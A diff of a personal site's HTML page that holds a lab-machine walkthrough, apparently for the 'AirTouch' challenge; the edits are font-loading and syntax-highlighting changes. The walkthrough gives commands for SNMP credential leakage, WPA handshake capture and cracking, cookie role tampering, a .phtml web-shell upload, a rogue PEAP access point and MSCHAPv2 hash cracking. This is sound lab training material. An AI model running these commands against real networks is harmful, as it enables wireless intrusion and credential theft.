@@ -14,7 +14,8 @@
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap"></noscript>
 <link rel="stylesheet" href="/assets/css/os.css">
 <link rel="stylesheet" href="/assets/css/article.css">
 <link rel="stylesheet" href="/assets/css/blocks.css">
@@ -23,7 +24,12 @@
   var d = document.documentElement;
   d.className = d.className.replace('nojs', 'js');
   try {
-    if (localStorage.getItem('rc-body') === 'sans') d.setAttribute('data-body', 'sans');
+    if (localStorage.getItem('rc-body') === 'sans') {
+      d.setAttribute('data-body', 'sans');
+      var f = document.createElement('link'); f.id = 'font-sans'; f.rel = 'stylesheet';
+      f.href = 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap';
+      document.head.appendChild(f);
+    }
     var root = location.pathname === '/' || location.pathname === '/index.html';
     if (root && !sessionStorage.getItem('rc-booted') && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
       d.classList.add('booting');
@@ -84,9 +90,9 @@
 <div class="wp-stage-body"><p>TCP scan only shows SSH. Don&#39;t stop there: UDP reveals <span class="hl-warn">SNMP on 161</span>, and the default <code>public</code> community string is wide open. <code>snmpwalk</code> prints management data that includes the consultant credential:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ snmpwalk -v2c -c public 10.129.12.147 | grep -i &#39;consultant\|pass&#39;
+<pre class="wp-term-body"><code class="hljs language-bash">$ snmpwalk -v2c -c public 10.129.12.147 | grep -i <span class="hljs-string">&#x27;consultant\|pass&#x27;</span>
 ...
-iso.3.6.1.2.1.1.4.0 = STRING: &quot;consultant / [REDACTED]&quot;
+iso.3.6.1.2.1.1.4.0 = STRING: <span class="hljs-string">&quot;consultant / [REDACTED]&quot;</span>
 
 $ ssh consultant@10.129.12.147
 consultant@airtouch:~$ sudo -l
@@ -107,7 +113,7 @@ consultant@airtouch:~$ sudo -l
 <div class="wp-stage-body"><p>Monitor-mode on one adapter, deauth from another (you need a second radio or you&#39;ll knock yourself off during capture):</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · root@airtouch</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ airmon-ng start wlan0
+<pre class="wp-term-body"><code class="hljs language-bash">$ airmon-ng start wlan0
 $ airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 \
     -w /tmp/airtouch-internet wlan0mon
 
@@ -116,7 +122,7 @@ $ aireplay-ng --deauth 5 \
     -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan2mon
 
 $ aircrack-ng -w /usr/share/wordlists/rockyou.txt \
-    /tmp/airtouch-internet-01.cap
+    /tmp/airtouch-internet-01.<span class="hljs-built_in">cap</span>
 KEY FOUND! [ [REDACTED] ]</code></pre>
 </div>
 
@@ -124,7 +130,7 @@ KEY FOUND! [ [REDACTED] ]</code></pre>
 <p>Associate and DHCP:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · wpa_supplicant</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ wpa_supplicant -B -i wlan3 -c /tmp/wpa-airtouch.conf
+<pre class="wp-term-body"><code class="hljs language-bash">$ wpa_supplicant -B -i wlan3 -c /tmp/wpa-airtouch.conf
 $ dhclient wlan3</code></pre>
 </div>
 
@@ -142,24 +148,23 @@ $ dhclient wlan3</code></pre>
 <div class="wp-stage-body"><p>Easy to panic and attack the router&#39;s login directly. Smarter move: decrypt what you already captured:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · airdecap-ng</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ airdecap-ng -e AirTouch-Internet -p [REDACTED] \
-    /tmp/airtouch-internet-01.cap
+<pre class="wp-term-body"><code class="hljs language-bash">$ airdecap-ng -e AirTouch-Internet -p [REDACTED] \
+    /tmp/airtouch-internet-01.<span class="hljs-built_in">cap</span>
 Number of decrypted WEP packets: 0
 Number of decrypted WPA packets: 312</code></pre>
 </div>
 
 
 <p>Open the decrypted pcap in Wireshark. HTTP requests to the router carry:</p>
-<pre><code>Cookie: PHPSESSID=abcd1234; UserRole=user
-</code></pre>
+<pre><code class="hljs language-routeros">Cookie: <span class="hljs-attribute">PHPSESSID</span>=abcd1234; <span class="hljs-attribute">UserRole</span>=user</code></pre>
 <p><span class="hl-warn">Role is in the cookie.</span> Replay with <code>UserRole=admin</code> → the upload page appears. <code>.php</code> is blocked, <code>.phtml</code> is not:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ curl -b &#39;PHPSESSID=...; UserRole=admin&#39; \
-    -F &#39;file=@reader.phtml&#39; \
+<pre class="wp-term-body"><code class="hljs language-bash">$ curl -b <span class="hljs-string">&#x27;PHPSESSID=...; UserRole=admin&#x27;</span> \
+    -F <span class="hljs-string">&#x27;file=@reader.phtml&#x27;</span> \
     http://192.168.3.1/upload.php
 
-$ curl &quot;http://192.168.3.1/uploads/reader.phtml?c=id&quot;
+$ curl <span class="hljs-string">&quot;http://192.168.3.1/uploads/reader.phtml?c=id&quot;</span>
 uid=33(www-data) gid=33(www-data)</code></pre>
 </div>
 
@@ -184,7 +189,7 @@ uid=33(www-data) gid=33(www-data)</code></pre>
 <p>Stand up <code>eaphammer</code> as a rogue AP using the stolen certs and capture someone&#39;s authentication:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · eaphammer</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ eaphammer -i wlan4 --essid AirTouch-Office \
+<pre class="wp-term-body"><code class="hljs language-bash">$ eaphammer -i wlan4 --essid AirTouch-Office \
     --creds --auth peap --server-cert /root/certs/ca.crt \
     --private-key /root/certs/ca.key
 ...
@@ -197,7 +202,7 @@ uid=33(www-data) gid=33(www-data)</code></pre>
 <p>Format for hashcat mode 5500 and crack:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · hashcat</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ echo &#39;r4ulcl::::[MSCHAPV2-CHALLENGE]:[MSCHAPV2-RESPONSE]&#39; \
+<pre class="wp-term-body"><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;r4ulcl::::[MSCHAPV2-CHALLENGE]:[MSCHAPV2-RESPONSE]&#x27;</span> \
     &gt; mschapv2.hash
 $ hashcat -m 5500 mschapv2.hash /usr/share/wordlists/rockyou.txt
 ...
@@ -208,16 +213,16 @@ r4ulcl:[REDACTED]</code></pre>
 <p>Build a <code>wpa_supplicant</code> conf and join the office net — <span class="hl-warn">single backslash</span> in the identity string, not double:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · office wpa_supplicant</span></div>
-<pre class="wp-term-body"><code class="language-bash">network={
-    ssid=&quot;AirTouch-Office&quot;
+<pre class="wp-term-body"><code class="hljs language-bash">network={
+    ssid=<span class="hljs-string">&quot;AirTouch-Office&quot;</span>
     scan_ssid=1
     scan_freq=5220
     key_mgmt=WPA-EAP
     eap=PEAP
-    identity=&quot;AirTouch\r4ulcl&quot;
-    password=&quot;[REDACTED]&quot;
-    ca_cert=&quot;/tmp/ca.crt&quot;
-    phase2=&quot;auth=MSCHAPV2&quot;
+    identity=<span class="hljs-string">&quot;AirTouch\r4ulcl&quot;</span>
+    password=<span class="hljs-string">&quot;[REDACTED]&quot;</span>
+    ca_cert=<span class="hljs-string">&quot;/tmp/ca.crt&quot;</span>
+    phase2=<span class="hljs-string">&quot;auth=MSCHAPV2&quot;</span>
 }
 
 $ wpa_supplicant -B -i wlan5 -c /tmp/office.conf
@@ -238,12 +243,12 @@ $ dhclient wlan5</code></pre>
 <div class="wp-stage-body"><p>SSH to management as <code>remote</code> with the creds from <code>send_certs.sh</code>. <code>remote</code> has no sudo — but the hostapd file used by the WPE patch ships with cleartext users and is <code>0644</code>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · remote@airtouch-mgmt</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ ls -l /etc/hostapd/hostapd_wpe.eap_user
+<pre class="wp-term-body"><code class="hljs language-bash">$ <span class="hljs-built_in">ls</span> -l /etc/hostapd/hostapd_wpe.eap_user
 -rw-r--r-- 1 root root  /etc/hostapd/hostapd_wpe.eap_user
 
-$ cat /etc/hostapd/hostapd_wpe.eap_user
-&quot;admin&quot;    PEAP
-&quot;admin&quot;    MSCHAPV2  &quot;[REDACTED]&quot;  [2]</code></pre>
+$ <span class="hljs-built_in">cat</span> /etc/hostapd/hostapd_wpe.eap_user
+<span class="hljs-string">&quot;admin&quot;</span>    PEAP
+<span class="hljs-string">&quot;admin&quot;</span>    MSCHAPV2  <span class="hljs-string">&quot;[REDACTED]&quot;</span>  [2]</code></pre>
 </div>
 
 
@@ -275,9 +280,6 @@ $ cat /etc/hostapd/hostapd_wpe.eap_user
   </section>
 </main>
 <footer class="nojs-foot">© 2026 Will DeDominico · <a href="https://github.com/Moriz82">GitHub</a> · <a href="https://www.linkedin.com/in/wdedo/">LinkedIn</a></footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/swift.min.js" defer></script>
 <script type="module" src="/assets/js/os/main.js"></script>
 </body>
 </html>
